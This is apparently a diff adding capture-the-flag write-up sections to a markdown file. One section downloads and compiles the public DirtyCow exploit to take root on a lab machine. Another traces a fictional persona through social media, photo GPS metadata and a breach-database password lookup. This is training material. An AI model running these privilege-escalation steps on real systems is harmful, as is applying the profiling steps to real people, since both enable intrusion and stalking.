@@ -4,3 +4,110 @@
 
 ## Day 13: Coal for Christmas
 
+scan the target
+
+```
+nmap -sS -sV -T4 10.10.22.125
+```
+
+![image](https://user-images.githubusercontent.com/90561566/222445181-223f51f0-5577-4723-92ea-b5e2d54c69cd.png)
+
+telnet into the server, it also gives us the password
+
+![image](https://user-images.githubusercontent.com/90561566/222445565-399e1120-7579-4ab7-9403-b902ba5b5020.png)
+
+we have some infor here
+
+![image](https://user-images.githubusercontent.com/90561566/222446673-60a84c7b-91cf-4c8a-92e7-268576e4c0e3.png)
+
+quick research the file, you will found a version here
+
+```
+wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+```
+
+transfer the file
+
+![image](https://user-images.githubusercontent.com/90561566/222449024-13b9372a-8cf0-43ee-ab33-446d396b19b3.png)
+
+run the file
+
+```
+gcc -pthread dirty.c -o dirty -lcrypt
+```
+
+![image](https://user-images.githubusercontent.com/90561566/222449198-2b06197c-57bc-414d-84c4-39635464a6d9.png)
+
+we have changed password of an root's user
+
+![image](https://user-images.githubusercontent.com/90561566/222449583-96b6909f-295c-476f-8713-df0c1376ac28.png)
+
+there is an instruction for you
+
+![image](https://user-images.githubusercontent.com/90561566/222449891-e6e847f8-077a-48de-83c5-d8e95690d12f.png)
+
+```
+touch coal
+tree | md5sum
+```
+
+![image](https://user-images.githubusercontent.com/90561566/222450055-2de4cf16-d2d2-4c70-9e0b-937620be0c76.png)
+
+Answer:
+
+![image](https://user-images.githubusercontent.com/90561566/222459180-070864b2-ba15-4177-8bcc-c797b95871d4.png)
+
+![image](https://user-images.githubusercontent.com/90561566/222459226-44c19abd-3fcd-4d45-94e4-02bc1033303e.png)
+
+![image](https://user-images.githubusercontent.com/90561566/222459284-91e5153f-628b-4ef5-bd36-9f042d9bee2c.png)
+
+![image](https://user-images.githubusercontent.com/90561566/222459539-0d9dbc52-dd86-436d-afef-0dc72c88031f.png)
+
+## Day 14: Where's Rudolph?
+
+search his username on google, i see 2 social accounts: twitter and reddit
+
+![image](https://user-images.githubusercontent.com/90561566/222453488-5f7b6f64-18eb-47b5-a223-b9f2d2ce5ced.png)
+
+in his reddit account, click tab comments
+
+![image](https://user-images.githubusercontent.com/90561566/222452436-7b89398a-1d32-47ac-a0c2-dc0b8cf19b59.png)
+
+search robert in google, you will found the next question
+
+![image](https://user-images.githubusercontent.com/90561566/222453138-b534da7f-8391-4ac0-accd-25d4d11d89f4.png)
+
+on his twitter, search for a tv show, it's bachelorette
+
+![image](https://user-images.githubusercontent.com/90561566/222454717-afd87fea-fe18-4112-b34f-cc4f058b7769.png)
+
+he has posted 2 images, on google image, you can find it's chicago
+
+![image](https://user-images.githubusercontent.com/90561566/222455870-52d65996-9a0f-46ef-9d50-07af641e0867.png)
+
+download the high resolution image and check for the exif infor
+
+```
+exiftool lights-festival-website.jpg
+```
+
+also in the exif data, they have a GPS Position and copyright infor contain our flag
+
+search his email in scylla.sh, his password was reveal as spygame
+
+Use the GPS Position we found earlier on openstreetmap, Look for the nearest Hotel: Chicago Marriott Downtown Magnificent Mile
+
+Answer:
+
+![image](https://user-images.githubusercontent.com/90561566/222459653-6cea6b2b-e719-47b0-8522-d2079745acec.png)
+
+![image](https://user-images.githubusercontent.com/90561566/222459699-ca29013c-cca1-4ed4-8f16-881c0f057d61.png)
+
+## Day 15: There's a Python in my stocking!
+
+
+
+
+
+
+
